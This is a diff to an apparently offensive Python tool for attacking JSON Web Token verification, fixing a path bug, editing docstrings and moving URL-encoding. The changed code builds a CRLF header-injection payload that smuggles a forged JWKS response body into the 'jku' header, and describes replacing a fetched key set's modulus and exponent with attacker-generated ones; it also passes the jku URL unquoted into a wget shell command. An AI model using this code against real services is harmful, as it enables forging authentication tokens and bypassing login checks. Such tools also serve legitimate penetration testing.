@@ -29,7 +29,7 @@ try:
     from config import cwd
 except ImportError:
     path = sys.argv[0]
-    if len(script.path("/")) > 1:
+    if len(path.split("/")) > 1:
         cwd = f"{'/'.join(path.split('/')[:-1])}/"
     else:
         cwd = ""
@@ -157,12 +157,13 @@ class Cracker:
         1)Validate the token: Using check_token, looks if the token is valid. If not quits out.
 
         2)Validate alg: If an algorithm has been passed, it checks that's a valid one. If it's None or none it reminds
-        to the user that some libraries accept None and other none. Then does a case sensitive correction if hs256 has
-        been passed as alg. Last but not least, if any jku argument is present, it force the alg to be RSA.
+        to the user that some libraries accept None and other none. Then does a case sensitive correction if hs256 or rs256
+        has been passed as alg. Last but not least, if any jku argument is present, it force the alg to be RSA.
+        Since the user can not passes more than one jku related argument, the script look for this and eventually quits.
 
         3)Validate key: This is the most complex validation since the key can be retrieved from different arguments.
         This validation has to solve lot of possible conflicts, at least giving warnings to the user and giving priority
-        to the wright argument. First, if a jku argument has been passed, the scripts checks that no other key related one
+        to the right argument. First, if a jku argument has been passed, the scripts checks that no other key related one
         has been passed too, and if it quits out. Else it generates a priv pub pair with openssl and extracs the modulus and
         the esponent. Since now, if any jku arg has been passed, we know that not other args has, so the validation ends here.
         If it goes on, it means that we have no jku arg, so we don't need to check for it later in the function.
@@ -321,7 +322,8 @@ class Cracker:
                 sys.exit(2)
             body = self.jku_via_header_injection(header_dict)
             content_length = len(body)
-            injection = f"%0d%0aContent-Length:%20{content_length}%0d%0a%0d%0a{body}"
+            body = body.replace("[", "%5b").replace("]", "%5d").replace("{", "%7b").replace("}", "%7d").replace(" ", "%20")
+            injection = f"%0d%0aContent-Length:+{content_length}%0d%0a%0d%0a{body}"
             url = self.jku_header_injection.replace("HERE", injection)
             header_dict['jku'] = url
         if self.user_payload:
@@ -333,7 +335,7 @@ class Cracker:
 
     def jku_basic_attack(self, header):
         """
-        :param header the header dictionary to modify -> dict.
+        :param header: the header dictionary to modify -> dict.
         Get the jwks.json file from the url specified in the jku header. Then loads the file as json and accesses
         it to change the modulus and the esponent with the ones of our generated key. Then creates a new file in
         .well-known/jwks.json and write into it the dumps of the dict.
@@ -356,6 +358,11 @@ class Cracker:
 
     def jku_via_header_injection(self, header):
         """
+        :param header: the header dictonary to modify -> dict.
+        Same as self.jku_basic_attack, but instead of write a jwks file, it returns in an http response body
+        format.
+
+        :return: The crafted jwks string in an http response body format.
         """
         devnull_ = open(os.devnull, 'wb')
         command = "wget " + header['jku']
@@ -370,7 +377,6 @@ class Cracker:
         ).decode('utf-8').rstrip("=")
         body = json.dumps(jwks_dict)
         devnull_.close()
-        body = body.replace("[", "%5B").replace("]", "%5D").replace("{", "%7B").replace("}", "%7D").replace(" ", "%20")
         return body
 
     def select_signature(self, partial_token):
